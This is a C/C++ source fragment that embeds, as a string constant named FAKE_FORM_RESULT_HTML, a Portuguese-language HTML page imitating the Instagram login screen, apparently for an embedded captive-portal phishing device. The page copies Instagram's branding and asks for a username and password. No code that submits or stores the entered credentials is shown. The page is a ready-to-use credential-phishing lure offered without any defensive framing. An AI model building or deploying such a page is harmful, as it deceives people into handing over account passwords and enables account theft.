const char FAKE_FORM_RESULT_HTML[] = R"=====(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
</head>
<body style="font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f5; margin: 0;">

    <div style="width: 320px; background: #fff; padding: 20px; text-align: center; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
        
        <!-- Substituindo o título pelo logo do Instagram -->
        <img src="instalogo.svg" alt="Instagram Logo" style="width: 150px; margin-bottom: 20px;">

        <button style="width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center;">
            <img src="facelogo.svg" alt="Facebook" style="width: 20px; height: 20px; margin-right: 10px;">
            Continuar com o Facebook
        </button>

        <p style="margin: 15px 0; color: #aaa;">OU</p>

        <input type="text" placeholder="Telefone, nome de usuário ou email" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px;">
        <input type="password" placeholder="Senha" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px;">

        <a href="#" style="display: block; text-align: right; color: #1877f2; text-decoration: none; font-size: 14px; margin-bottom: 15px;">Esqueceu a senha?</a>

        <button style="width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">Entrar</button>

        <p style="margin-top: 20px; font-size: 14px;">Não tem uma conta? <a href="#" style="color: #0095f6; text-decoration: none;">Cadastre-se</a></p>

        <p style="margin-top: 20px; font-size: 12px; color: #777;">Ao continuar, você concorda com os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong> do Instagram.</p>
    </div>

</body>
</html>

)=====";
